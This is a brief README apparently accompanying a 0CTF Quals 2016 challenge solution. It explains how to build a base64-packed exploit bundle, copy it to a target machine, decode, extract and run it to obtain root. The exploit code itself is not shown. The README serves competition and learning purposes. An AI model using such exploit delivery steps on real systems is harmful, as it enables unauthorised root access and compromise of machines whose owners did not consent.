0CTF Quals 2016 (づ￣ 3￣)づ challenge
========================================

Build with:
```
make
```
This will create a file x.64, that can be copy
and pasted to the target machine. On the target
machine run the following:
```
base64 -d x.64 > x.tar
tar xf x.tar
./x
```
This should give you root.
